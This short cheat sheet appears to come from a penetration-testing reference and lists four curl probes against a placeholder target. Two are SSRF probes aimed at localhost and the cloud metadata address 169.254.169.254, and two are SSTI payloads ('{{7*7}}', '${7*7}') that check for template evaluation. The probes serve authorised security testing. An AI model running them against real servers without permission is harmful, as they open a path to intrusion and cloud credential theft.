# SSRF and SSTI probes

Small probes for server-side fetch and template behaviour.

<div class="ol-section-kicker"><span>WEB</span></div>

## SSRF localhost probe

```bash
curl -sk 'https://<TARGET>/fetch?url=http://127.0.0.1/'
```

**Tool:** curl · **Platform:** Cross-platform


## SSRF metadata-shaped probe

```bash
curl -sk 'https://<TARGET>/fetch?url=http://169.254.169.254/'
```

**Tool:** curl · **Platform:** Cross-platform


## SSTI Jinja-style arithmetic

```bash
curl -skG https://<TARGET>/ --data-urlencode 'name={{7*7}}'
```

**Tool:** curl · **Platform:** Cross-platform


## SSTI alternate arithmetic

```bash
curl -skG https://<TARGET>/ --data-urlencode 'name=${7*7}'
```

**Tool:** curl · **Platform:** Cross-platform
